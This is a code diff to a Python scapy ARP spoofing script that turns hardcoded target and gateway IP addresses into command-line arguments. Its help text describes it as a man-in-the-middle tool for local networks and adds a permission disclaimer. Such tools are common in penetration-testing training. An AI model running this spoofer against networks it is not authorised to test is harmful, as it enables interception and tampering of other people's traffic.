@@ -3,6 +3,7 @@ from tabnanny import verbose
 import scapy.all as scapy
 import time
 import sys
+import argparse
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -25,8 +26,13 @@ def restore(destination_ip, source_ip):
     packet = ether / arp
     scapy.sendp(packet, count=4, verbose=False)
 
-target_ip = "192.168.85.159"
-gateway_ip = "192.168.85.2"
+parser = argparse.ArgumentParser(description="Simple ARP spoofer for MITM on a local network (use only on networks you own or have permission to test).")
+parser.add_argument("-t", "--target", dest="target_ip", required=True, help="IP address of the target machine")
+parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="IP address of the gateway/router")
+args = parser.parse_args()
+
+target_ip = args.target_ip
+gateway_ip = args.gateway_ip
 target_mac = get_mac(target_ip)
 gateway_mac = get_mac(gateway_ip)
 
